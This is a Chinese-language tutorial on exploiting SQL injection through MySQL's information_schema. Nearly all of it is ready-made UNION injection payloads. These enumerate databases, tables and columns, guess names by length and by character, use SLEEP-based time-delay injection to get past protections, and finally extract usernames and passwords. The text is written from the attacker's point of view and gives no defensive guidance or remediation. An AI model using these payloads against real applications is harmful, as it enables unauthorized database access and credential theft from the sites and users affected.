在 SQL 注入中，攻击者通常利用 `information_schema` 表来获取数据库的结构信息，包括数据库名称、表名和列名。这是因为 `information_schema` 是一个元数据库，存储了数据库的所有元数据。

### **利用 `information_schema` 的简介逻辑**

1. **确定注入点**
   找到可以注入 SQL 语句的输入位置，例如登录页面或搜索框。

2. **列出数据库**
   利用 `information_schema.schemata` 查看目标系统中所有的数据库名称：

   ```sql
   SELECT schema_name FROM information_schema.schemata;
   ```

3. **列出目标数据库中的表**
   确定目标数据库后，利用 `information_schema.tables` 查看其中的所有表：

   ```sql
   SELECT table_name FROM information_schema.tables WHERE table_schema = 'target_database';
   ```

4. **列出目标表的列**
   确定目标表后，利用 `information_schema.columns` 查看表的列名：

   ```sql
   SELECT column_name FROM information_schema.columns WHERE table_name = 'target_table';
   ```

5. **提取敏感数据**
   使用前面获取的表名和列名，直接查询表中的敏感数据，例如用户账号和密码：

   ```sql
   SELECT username, password FROM target_table;
   ```

------

### **核心操作**

- **`schemata`**：查看数据库列表
- **`tables`**：查看表列表
- **`columns`**：查看列列表

通过 `UNION` 或条件查询，攻击者逐步构建目标数据库结构的完整图谱，为提取数据做准备。



以下是常见的利用方式：

------

## **1. 获取数据库列表**

目标：列出目标服务器上的所有数据库。

```sql
SELECT schema_name FROM information_schema.schemata;
```

假设注入点是 `username` 参数，攻击者可能构造如下注入：

```sql
' UNION SELECT schema_name, null FROM information_schema.schemata -- 
```

------

## **2. 获取某个数据库中的所有表**

目标：枚举目标数据库的所有表。

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'target_database';
```

攻击者可以通过注入如下语句，爆破目标数据库的表名：

```sql
' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = 'target_database' -- 
```

如果目标表名未知，可以逐步爆破其长度和字符内容。

------

## **3. 获取某个表的列信息**

目标：枚举目标表的列名，用于后续的敏感数据提取。

```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'target_table';
```

攻击者可能构造如下注入语句：

```sql
' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'target_table' -- 
```

如果目标列名未知，也可以逐步爆破长度和字符内容。

------

## **4. 获取列类型等其他信息**

目标：了解目标列的类型、约束等详细信息，为后续攻击（如类型转换或 Bypass）做准备。

```sql
SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'target_table';
```

SQL 注入示例：

```sql
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'target_table' -- 
```

------

## **5. 获取表和列的组合信息**

目标：列出所有数据库、表和列信息的组合，全面分析目标系统。

```sql
SELECT table_schema, table_name, column_name FROM information_schema.columns;
```

SQL 注入示例：

```sql
' UNION SELECT table_schema, table_name, column_name FROM information_schema.columns -- 
```

------

## **6. 动态爆破信息**

当目标系统有字符长度限制或不能直接返回完整结果时，攻击者可以动态猜测元信息：

- 按长度猜测：

  ```sql
  ' UNION SELECT column_name, null FROM information_schema.columns WHERE LENGTH(column_name) = 5 -- 
  ```

- 按字符猜测：

  使用逐字符比对的方法，如：

  ```sql
  ' UNION SELECT column_name, null FROM information_schema.columns WHERE column_name LIKE 'pass%' -- 
  ```

------

## **7. 获取敏感数据**

一旦攻击者知道了表和列的具体名称，就可以结合这些信息，提取敏感数据，例如用户表的用户名和密码。

```sql
SELECT username, password FROM target_database.users;
```

SQL 注入语句可能如下：

```sql
' UNION SELECT username, password FROM target_database.users -- 
```

------

## **8. 绕过防护**

条件过滤： 使用条件语句避免抛出异常：

```sql
' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users' AND column_name LIKE 'a%' -- 
```

延时注入： 利用 

```sql
SLEEP()
```

 等函数确认元数据是否存在：

```sql
' UNION SELECT IF(LENGTH(table_name) = 5, SLEEP(5), NULL) FROM information_schema.tables -- 
```

------

### **总结**

利用 `information_schema` 的核心目标是枚举目标数据库的结构信息，这为进一步提取敏感数据和实施攻击奠定了基础。攻击者会通过以下步骤：

1. 获取数据库名称；
2. 获取目标数据库的表名；
3. 获取目标表的列名；
4. 提取敏感数据。
